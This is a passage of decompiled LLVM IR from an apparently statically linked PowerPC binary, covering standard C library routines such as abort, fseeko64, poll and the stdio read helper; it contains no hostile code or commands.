  %v2_1000e428 = add i32 %v1_1000e428, 136
  %v3_1000e428 = inttoptr i32 %v2_1000e428 to i32*
  %v0_1000e42c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e42c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e42c = add i32 %v1_1000e42c, 132
  %v3_1000e42c = inttoptr i32 %v2_1000e42c to i32*
  store i32 %v0_1000e42c, i32* %v3_1000e42c, align 4
  %v0_1000e434.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e430

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e404, %dec_label_pc_1000e3d4, %dec_label_pc_1000e414
  %v0_1000e434 = phi i32 [ %v0_1000e3f0, %dec_label_pc_1000e404 ], [ %v0_1000e3f0, %dec_label_pc_1000e3d4 ], [ %v0_1000e434.pre, %dec_label_pc_1000e414 ]
  store i32 %v0_1000e388, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e434

; uselistorder directives
  uselistorder i32 %v0_1000e3f0, { 0, 1, 3, 2 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000e430, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e3d4, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e47c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000e460 = call i32 @__pthread_return_0()
  %v2_1000e468 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000e468, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000e48033 = add i32 %v2_1000e468, 124
  %v4_1000e48034 = inttoptr i32 %v3_1000e48033 to i32*
  store i32 0, i32* %v4_1000e48034, align 4
  %v0_1000e48435 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e48436 = add i32 %v0_1000e48435, -1
  store i32 %v1_1000e48436, i32* %r9.global-to-local, align 4
  %v0_1000e48837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e48838 = add i32 %v0_1000e48837, -1
  store i32 %v1_1000e48838, i32* %ctr.global-to-local, align 4
  %v2_1000e48839 = icmp eq i32 %v1_1000e48838, 0
  br i1 %v2_1000e48839, label %dec_label_pc_1000e48c, label %dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge

dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge: ; preds = %dec_label_pc_1000e47c.lr.ph, %dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge
  %v1_1000e48440 = phi i32 [ %v1_1000e484, %dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge ], [ %v1_1000e48436, %dec_label_pc_1000e47c.lr.ph ]
  %v0_1000e480.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e480.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000e47c = mul i32 %v1_1000e48440, 4
  %v3_1000e480 = add i32 %v1_1000e47c, %v1_1000e480.pre
  %v4_1000e480 = inttoptr i32 %v3_1000e480 to i32*
  store i32 %v0_1000e480.pre, i32* %v4_1000e480, align 4
  %v0_1000e484 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e484 = add i32 %v0_1000e484, -1
  store i32 %v1_1000e484, i32* %r9.global-to-local, align 4
  %v0_1000e488 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e488 = add i32 %v0_1000e488, -1
  store i32 %v1_1000e488, i32* %ctr.global-to-local, align 4
  %v2_1000e488 = icmp eq i32 %v1_1000e488, 0
  br i1 %v2_1000e488, label %dec_label_pc_1000e48c, label %dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge

dec_label_pc_1000e48c:                            ; preds = %dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge, %dec_label_pc_1000e47c.lr.ph
  store i32 %v2_1000e468, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_1000e494 = call i32 @__sigaddset()
  %v3_1000e498 = icmp eq i32 %v0_1000e494, 0
  br i1 %v3_1000e498, label %dec_label_pc_1000e4a0, label %dec_label_pc_1000e4b0

dec_label_pc_1000e4a0:                            ; preds = %dec_label_pc_1000e48c
  store i32 268494000, i32* @lr, align 4
  %v3_1000e4ac = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1000e468, i32 0)
  br label %dec_label_pc_1000e4b0

dec_label_pc_1000e4b0:                            ; preds = %dec_label_pc_1000e48c, %dec_label_pc_1000e4a0
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e4b4 = load i32, i32* @global_var_10024a94.674, align 4
  %v3_1000e4b8 = icmp eq i32 %v3_1000e4b4, 0
  br i1 %v3_1000e4b8, label %dec_label_pc_1000e4c0, label %dec_label_pc_1000e4e8

dec_label_pc_1000e4c0:                            ; preds = %dec_label_pc_1000e4b0
  store i32 1, i32* @global_var_10024a94.674, align 4
  br label %dec_label_pc_1000e4c8

dec_label_pc_1000e4c8:                            ; preds = %dec_label_pc_1000e544, %dec_label_pc_1000e4c0
  store i32 ptrtoint (i32* @global_var_100249c0.672 to i32), i32* %r29.global-to-local, align 4
  %v0_1000e4d4 = call i32 @__pthread_return_0()
  store i32 268494048, i32* @lr, align 4
  %v1_1000e4dc = call i32 @__raise(i32 6)
  %v0_1000e4e4 = call i32 @__pthread_return_0()
  %v3_1000e4ec.pre = load i32, i32* @global_var_10024a94.674, align 4
  br label %dec_label_pc_1000e4e8

dec_label_pc_1000e4e8:                            ; preds = %dec_label_pc_1000e4b0, %dec_label_pc_1000e4c8
  %v0_1000e560 = phi i32 [ %v3_1000e4b4, %dec_label_pc_1000e4b0 ], [ %v3_1000e4ec.pre, %dec_label_pc_1000e4c8 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e4f0 = icmp eq i32 %v0_1000e560, 1
  br i1 %v3_1000e4f0, label %dec_label_pc_1000e530.lr.ph, label %dec_label_pc_1000e560

dec_label_pc_1000e530.lr.ph:                      ; preds = %dec_label_pc_1000e4e8
  %v2_1000e4fc = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_10024a94.674, align 4
  store i32 ptrtoint (i32* @global_var_1000e510.676 to i32), i32* @lr, align 4
  %v3_1000e50c = call i32 @__GI_memset(i32 %v2_1000e4fc, i32 0, i32 140)
  store i32 %v2_1000e468, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000e48033, i32* %r9.global-to-local, align 4
  %v2_1000e53825 = add i32 %v2_1000e468, 256
  %v3_1000e53826 = inttoptr i32 %v2_1000e53825 to i32*
  store i32 -1, i32* %v3_1000e53826, align 4
  %v0_1000e53c27 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e53c28 = add i32 %v0_1000e53c27, -1
  store i32 %v1_1000e53c28, i32* %r11.global-to-local, align 4
  %v0_1000e54029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e54030 = add i32 %v0_1000e54029, -1
  store i32 %v1_1000e54030, i32* %ctr.global-to-local, align 4
  %v2_1000e54031 = icmp eq i32 %v1_1000e54030, 0
  br i1 %v2_1000e54031, label %dec_label_pc_1000e544, label %dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge

dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge: ; preds = %dec_label_pc_1000e530.lr.ph, %dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge
  %v1_1000e53c32 = phi i32 [ %v1_1000e53c, %dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge ], [ %v1_1000e53c28, %dec_label_pc_1000e530.lr.ph ]
  %v1_1000e534.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000e538.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e530 = mul i32 %v1_1000e53c32, 4
  %v2_1000e534 = add i32 %v1_1000e530, %v1_1000e534.pre
  store i32 %v2_1000e534, i32* %r9.global-to-local, align 4
  %v2_1000e538 = add i32 %v2_1000e534, 132
  %v3_1000e538 = inttoptr i32 %v2_1000e538 to i32*
  store i32 %v0_1000e538.pre, i32* %v3_1000e538, align 4
  %v0_1000e53c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e53c = add i32 %v0_1000e53c, -1
  store i32 %v1_1000e53c, i32* %r11.global-to-local, align 4
  %v0_1000e540 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e540 = add i32 %v0_1000e540, -1
  store i32 %v1_1000e540, i32* %ctr.global-to-local, align 4
  %v2_1000e540 = icmp eq i32 %v1_1000e540, 0
  br i1 %v2_1000e540, label %dec_label_pc_1000e544, label %dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge

dec_label_pc_1000e544:                            ; preds = %dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge, %dec_label_pc_1000e530.lr.ph
  store i32 268494172, i32* @lr, align 4
  %v4_1000e558 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000e4c8

dec_label_pc_1000e560:                            ; preds = %dec_label_pc_1000e4e8
  %v3_1000e560 = icmp eq i32 %v0_1000e560, 2
  br i1 %v3_1000e560, label %dec_label_pc_1000e568, label %dec_label_pc_1000e574

dec_label_pc_1000e568:                            ; preds = %dec_label_pc_1000e560
  store i32 3, i32* @global_var_10024a94.674, align 4
  br label %dec_label_pc_1000e574

dec_label_pc_1000e574:                            ; preds = %dec_label_pc_1000e560, %dec_label_pc_1000e568
  %v3_1000e574 = phi i32 [ %v0_1000e560, %dec_label_pc_1000e560 ], [ 3, %dec_label_pc_1000e568 ]
  %v1_1000e57c = icmp ne i32 %v3_1000e574, 3
  call void @__pseudo_cond_branch(i1 %v1_1000e57c, i32 268494224)
  store i32 4, i32* @global_var_10024a94.674, align 4
  %v1_1000e58c = call i32 @__GI__exit(i32 127)
  ret i32 %v1_1000e58c

; uselistorder directives
  uselistorder i32 %v1_1000e540, { 1, 0 }
  uselistorder i32 %v1_1000e53c, { 1, 0 }
  uselistorder i32 %v1_1000e488, { 1, 0 }
  uselistorder i32 %v1_1000e484, { 1, 0 }
  uselistorder i32 %v2_1000e468, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 10, 9, 8, 7, 5, 4, 3, 6, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_10024a94.674, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 19, 20, 0, 15, 1, 24, 3, 2, 7, 4, 18, 16, 17, 10, 11, 12, 9, 21, 22, 23, 13, 14, 5, 8, 6 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000e574, { 1, 0 }
  uselistorder label %dec_label_pc_1000e530.dec_label_pc_1000e530_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e47c.dec_label_pc_1000e47c_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000e598 = add i32 %arg1, 28
  %v2_1000e598 = inttoptr i32 %v1_1000e598 to i32*
  %v3_1000e598 = load i32, i32* %v2_1000e598, align 4
  store i32 %v3_1000e598, i32* @global_var_10024a98.677, align 4
  %v1_1000e5a8 = add i32 %arg1, 44
  %v2_1000e5a8 = inttoptr i32 %v1_1000e5a8 to i32*
  %v3_1000e5a8 = load i32, i32* %v2_1000e5a8, align 4
  store i32 %v3_1000e5a8, i32* @global_var_10024a9c.678, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10024aa0.641, align 4
  %v0_1000e5dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000e5dc)
  store i32 12, i32* @r3, align 4
  %v0_1000e5e4 = call i32 @__syscall_error()
  ret i32 %v0_1000e5e4

; uselistorder directives
  uselistorder i32* @global_var_10024aa0.641, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e600 = call i32 @__asm_mfcr()
  %v1_1000e604 = and i32 %v0_1000e600, 268435456
  %v3_1000e604 = icmp eq i32 %v1_1000e604, 0
  store i32 %v0_1000e600, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e604, label %dec_label_pc_1000e61c, label %dec_label_pc_1000e610

dec_label_pc_1000e610:                            ; preds = %entry
  %v0_1000e610 = call i32 @__errno_location()
  %v0_1000e614 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e614 = inttoptr i32 %v0_1000e610 to i32*
  store i32 %v0_1000e614, i32* %v2_1000e614, align 4
  br label %dec_label_pc_1000e61c

dec_label_pc_1000e61c:                            ; preds = %entry, %dec_label_pc_1000e610
  %v0_1000e62c = phi i32 [ %v0_1000e600, %entry ], [ -1, %dec_label_pc_1000e610 ]
  ret i32 %v0_1000e62c

; uselistorder directives
  uselistorder label %dec_label_pc_1000e61c, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e648 = call i32 @__asm_mfcr()
  %v1_1000e64c = and i32 %v0_1000e648, 268435456
  %v3_1000e64c = icmp eq i32 %v1_1000e64c, 0
  store i32 %v0_1000e648, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e64c, label %dec_label_pc_1000e664, label %dec_label_pc_1000e658

dec_label_pc_1000e658:                            ; preds = %entry
  %v0_1000e658 = call i32 @__errno_location()
  %v0_1000e65c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e65c = inttoptr i32 %v0_1000e658 to i32*
  store i32 %v0_1000e65c, i32* %v2_1000e65c, align 4
  br label %dec_label_pc_1000e664

dec_label_pc_1000e664:                            ; preds = %entry, %dec_label_pc_1000e658
  %v0_1000e674 = phi i32 [ %v0_1000e648, %entry ], [ -1, %dec_label_pc_1000e658 ]
  ret i32 %v0_1000e674

; uselistorder directives
  uselistorder label %dec_label_pc_1000e664, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000e678 = load i32, i32* @r5, align 4
  store i32 %v0_1000e678, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_1000e680 = zext i1 %tmp to i32
  %v2_1000e680 = ashr i32 %arg1, 31
  %v3_1000e680 = and i32 %v2_1000e680, -2
  %v4_1000e680 = or i32 %v3_1000e680, %v1_1000e680
  %v3_1000e684 = inttoptr i32 %v4_1000e680 to i16*
  %v4_1000e684 = call i32 @__GI_fseeko64(i16* %v3_1000e684, i32 %arg1, i32 %v0_1000e678)
  ret i32 %v4_1000e684

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000e688 = load i32, i32* @r7, align 4
  %v0_1000e68c = load i32, i32* @lr, align 4
  store i32 %v0_1000e68c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e688, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000e688, 3
  br i1 %tmp9, label %dec_label_pc_1000e6c4, label %dec_label_pc_1000e6b0

dec_label_pc_1000e6b0:                            ; preds = %entry
  %v0_1000e6b0 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000e6bc = inttoptr i32 %v0_1000e6b0 to i32*
  store i32 22, i32* %v2_1000e6bc, align 4
  br label %dec_label_pc_1000e78c

dec_label_pc_1000e6c4:                            ; preds = %entry
  %v2_1000e6c4 = add i32 %tmp, 52
  %v3_1000e6c4 = inttoptr i32 %v2_1000e6c4 to i32*
  %v4_1000e6c4 = load i32, i32* %v3_1000e6c4, align 4
  store i32 %v4_1000e6c4, i32* @r28, align 4
  %v3_1000e6c8 = icmp eq i32 %v4_1000e6c4, 0
  br i1 %v3_1000e6c8, label %dec_label_pc_1000e6d0, label %dec_label_pc_1000e6f0

dec_label_pc_1000e6d0:                            ; preds = %dec_label_pc_1000e6c4
  %v2_1000e6d0 = add i32 %tmp, 56
  store i32 %v2_1000e6d0, i32* @r29, align 4
  %v2_1000e6d8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000e6d8, i32* @r3, align 4
  %v0_1000e6e4 = call i32 @__pthread_return_void()
  %v0_1000e6ec = call i32 @__pthread_return_0()
  %v0_1000e6f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e6f0

dec_label_pc_1000e6f0:                            ; preds = %dec_label_pc_1000e6c4, %dec_label_pc_1000e6d0
  %v0_1000e6fc = phi i32 [ %tmp, %dec_label_pc_1000e6c4 ], [ %v0_1000e6f0.pre, %dec_label_pc_1000e6d0 ]
  %v1_1000e6f0 = inttoptr i32 %v0_1000e6fc to i16*
  %v2_1000e6f0 = load i16, i16* %v1_1000e6f0, align 2
  %v3_1000e6f0 = zext i16 %v2_1000e6f0 to i32
  store i32 %v3_1000e6f0, i32* %r0.global-to-local, align 4
  %v1_1000e6f4 = and i32 %v3_1000e6f0, 64
  store i32 %v1_1000e6f4, i32* %r9.global-to-local, align 4
  %v3_1000e6f4 = icmp eq i32 %v1_1000e6f4, 0
  br i1 %v3_1000e6f4, label %dec_label_pc_1000e70c, label %dec_label_pc_1000e6fc

dec_label_pc_1000e6fc:                            ; preds = %dec_label_pc_1000e6f0
  store i32 %v0_1000e6fc, i32* @r3, align 4
  store i32 268494596, i32* @lr, align 4
  %v0_1000e700 = call i32 @__stdio_wcommit()
  %v3_1000e704 = icmp eq i32 %v0_1000e700, 0
  br i1 %v3_1000e704, label %dec_label_pc_1000e70c, label %dec_label_pc_1000e774

dec_label_pc_1000e70c:                            ; preds = %dec_label_pc_1000e6fc, %dec_label_pc_1000e6f0
  %v0_1000e70c = load i32, i32* @r30, align 4
  %v3_1000e70c = icmp eq i32 %v0_1000e70c, 1
  br i1 %v3_1000e70c, label %dec_label_pc_1000e714, label %dec_label_pc_1000e70c.dec_label_pc_1000e728_crit_edge

dec_label_pc_1000e70c.dec_label_pc_1000e728_crit_edge: ; preds = %dec_label_pc_1000e70c
  br label %dec_label_pc_1000e728

dec_label_pc_1000e714:                            ; preds = %dec_label_pc_1000e70c
  %v0_1000e714 = load i32, i32* @r31, align 4
  %v1_1000e714 = inttoptr i32 %v0_1000e714 to i16*
  %v2_1000e718 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268494624, i32* @lr, align 4
  %v4_1000e71c = call i32 @__stdio_adjust_position(i16* %v1_1000e714, i32 %v2_1000e718)
  %v1_1000e720 = icmp slt i32 %v4_1000e71c, 0
  br i1 %v1_1000e720, label %dec_label_pc_1000e774, label %dec_label_pc_1000e714.dec_label_pc_1000e728_crit_edge

dec_label_pc_1000e714.dec_label_pc_1000e728_crit_edge: ; preds = %dec_label_pc_1000e714
  %v0_1000e728.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e728

dec_label_pc_1000e728:                            ; preds = %dec_label_pc_1000e70c.dec_label_pc_1000e728_crit_edge, %dec_label_pc_1000e714.dec_label_pc_1000e728_crit_edge
  %v0_1000e728 = phi i32 [ %v0_1000e70c, %dec_label_pc_1000e70c.dec_label_pc_1000e728_crit_edge ], [ %v0_1000e728.pre, %dec_label_pc_1000e714.dec_label_pc_1000e728_crit_edge ]
  %v0_1000e72c = load i32, i32* @r31, align 4
  store i32 268494648, i32* @lr, align 4
  %v5_1000e734 = call i32 @__stdio_seek(i32 %v0_1000e72c, i32* nonnull %stack_var_-56, i32 %v0_1000e728)
  %v1_1000e738 = icmp slt i32 %v5_1000e734, 0
  br i1 %v1_1000e738, label %dec_label_pc_1000e774, label %dec_label_pc_1000e740

dec_label_pc_1000e740:                            ; preds = %dec_label_pc_1000e728
  %v0_1000e740 = load i32, i32* @r31, align 4
  %v1_1000e740 = inttoptr i32 %v0_1000e740 to i16*
  %v2_1000e740 = load i16, i16* %v1_1000e740, align 2
  %v3_1000e740 = zext i16 %v2_1000e740 to i32
  store i32 %v3_1000e740, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000e748 = add i32 %v0_1000e740, 8
  %v2_1000e748 = inttoptr i32 %v1_1000e748 to i32*
  %v3_1000e748 = load i32, i32* %v2_1000e748, align 4
  store i32 %v3_1000e748, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000e750 = and i32 %v3_1000e740, 65464
  store i32 %v1_1000e750, i32* %r0.global-to-local, align 4
  %v3_1000e754 = add i32 %v0_1000e740, 2
  %v4_1000e754 = inttoptr i32 %v3_1000e754 to i8*
  store i8 0, i8* %v4_1000e754, align 1
  %v0_1000e758 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e758 = load i32, i32* @r31, align 4
  %v2_1000e758 = add i32 %v1_1000e758, 28
  %v3_1000e758 = inttoptr i32 %v2_1000e758 to i32*
  store i32 %v0_1000e758, i32* %v3_1000e758, align 4
  %v0_1000e75c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e75c = trunc i32 %v0_1000e75c to i16
  %v2_1000e75c = load i32, i32* @r31, align 4
  %v3_1000e75c = inttoptr i32 %v2_1000e75c to i16*
  store i16 %v1_1000e75c, i16* %v3_1000e75c, align 2
  %v0_1000e760 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e760 = load i32, i32* @r31, align 4
  %v2_1000e760 = add i32 %v1_1000e760, 16
  %v3_1000e760 = inttoptr i32 %v2_1000e760 to i32*
  store i32 %v0_1000e760, i32* %v3_1000e760, align 4
  %v0_1000e764 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e764 = load i32, i32* @r31, align 4
  %v2_1000e764 = add i32 %v1_1000e764, 20
  %v3_1000e764 = inttoptr i32 %v2_1000e764 to i32*
  store i32 %v0_1000e764, i32* %v3_1000e764, align 4
  %v0_1000e768 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e768 = load i32, i32* @r31, align 4
  %v2_1000e768 = add i32 %v1_1000e768, 24
  %v3_1000e768 = inttoptr i32 %v2_1000e768 to i32*
  store i32 %v0_1000e768, i32* %v3_1000e768, align 4
  %v0_1000e76c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e76c = load i32, i32* @r31, align 4
  %v2_1000e76c = add i32 %v1_1000e76c, 44
  %v3_1000e76c = inttoptr i32 %v2_1000e76c to i32*
  store i32 %v0_1000e76c, i32* %v3_1000e76c, align 4
  br label %dec_label_pc_1000e778

dec_label_pc_1000e774:                            ; preds = %dec_label_pc_1000e6fc, %dec_label_pc_1000e728, %dec_label_pc_1000e714
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000e778

dec_label_pc_1000e778:                            ; preds = %dec_label_pc_1000e740, %dec_label_pc_1000e774
  %v0_1000e778 = load i32, i32* @r28, align 4
  %v3_1000e778 = icmp eq i32 %v0_1000e778, 0
  br i1 %v3_1000e778, label %dec_label_pc_1000e780, label %dec_label_pc_1000e78c

dec_label_pc_1000e780:                            ; preds = %dec_label_pc_1000e778
  %v2_1000e780 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000e780, i32* @r3, align 4
  %v0_1000e788 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e78c

dec_label_pc_1000e78c:                            ; preds = %dec_label_pc_1000e778, %dec_label_pc_1000e6b0, %dec_label_pc_1000e780
  store i32 %v0_1000e68c, i32* %r0.global-to-local, align 4
  %v0_1000e790 = load i32, i32* @r30, align 4
  ret i32 %v0_1000e790

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 4, 3, 2, 23, 22, 21, 20, 17, 16, 0, 35, 44, 43, 18, 42, 41, 40, 39, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 19, 29, 28, 27, 31, 30, 38, 26, 37, 1, 25, 24, 34, 33, 32 }
  uselistorder i32 ()* @__pthread_return_void, { 43, 42, 39, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0, 41, 40, 51, 50, 49, 48, 7, 6, 9, 8, 28, 27, 26, 25, 24, 23, 32, 31, 30, 29, 47, 46, 22, 21, 45, 44, 20, 19, 18, 17, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 56, { 1, 4, 3, 0, 2 }
  uselistorder i32 52, { 2, 3, 8, 0, 5, 1, 7, 6, 4 }
  uselistorder i32 22, { 2, 14, 12, 3, 13, 4, 5, 17, 6, 18, 7, 15, 8, 9, 16, 10, 11, 0, 1 }
  uselistorder label %dec_label_pc_1000e78c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e778, { 1, 0 }
  uselistorder label %dec_label_pc_1000e774, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e728, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6f0, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000e7b0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e7bc = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e7c4 = and i16 %v3_1000e7bc, 4
  %v3_1000e7c4 = icmp eq i16 %v1_1000e7c4, 0
  br i1 %v3_1000e7c4, label %dec_label_pc_1000e7cc, label %dec_label_pc_1000e804

dec_label_pc_1000e7cc:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000e7d8, label %dec_label_pc_1000e7d0

dec_label_pc_1000e7d0:                            ; preds = %dec_label_pc_1000e7cc
  br label %dec_label_pc_1000e7d8

dec_label_pc_1000e7d8:                            ; preds = %dec_label_pc_1000e7cc, %dec_label_pc_1000e7d0
  %v1_1000e7d8 = add i32 %tmp, 4
  %v2_1000e7d8 = inttoptr i32 %v1_1000e7d8 to i32*
  %v3_1000e7d8 = load i32, i32* %v2_1000e7d8, align 4
  store i32 %v3_1000e7d8, i32* %r3.global-to-local, align 4
  store i32 268494816, i32* @lr, align 4
  %v1_1000e7dc = call i32 @__libc_read(i32 %v3_1000e7d8)
  store i32 %v1_1000e7dc, i32* %r3.global-to-local, align 4
  %v2_1000e7e0 = icmp sgt i32 %v1_1000e7dc, 0
  br i1 %v2_1000e7e0, label %dec_label_pc_1000e804, label %dec_label_pc_1000e7e8

dec_label_pc_1000e7e8:                            ; preds = %dec_label_pc_1000e7d8
  %v3_1000e7e0 = icmp eq i32 %v1_1000e7dc, 0
  %v0_1000e7e8 = load i32, i32* @r31, align 4
  %v1_1000e7e8 = inttoptr i32 %v0_1000e7e8 to i16*
  %v2_1000e7e8 = load i16, i16* %v1_1000e7e8, align 2
  br i1 %v3_1000e7e0, label %dec_label_pc_1000e7f0, label %dec_label_pc_1000e7f8

dec_label_pc_1000e7f0:                            ; preds = %dec_label_pc_1000e7e8
  %v1_1000e7f0 = or i16 %v2_1000e7e8, 4
  br label %dec_label_pc_1000e800

dec_label_pc_1000e7f8:                            ; preds = %dec_label_pc_1000e7e8
  %v1_1000e7f8 = or i16 %v2_1000e7e8, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e800

dec_label_pc_1000e800:                            ; preds = %dec_label_pc_1000e7f0, %dec_label_pc_1000e7f8
  %v1_1000e7f0.sink.off0 = phi i16 [ %v1_1000e7f0, %dec_label_pc_1000e7f0 ], [ %v1_1000e7f8, %dec_label_pc_1000e7f8 ]
  store i16 %v1_1000e7f0.sink.off0, i16* %v1_1000e7e8, align 2
  %v0_1000e814.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e804

dec_label_pc_1000e804:                            ; preds = %entry, %dec_label_pc_1000e7d8, %dec_label_pc_1000e800
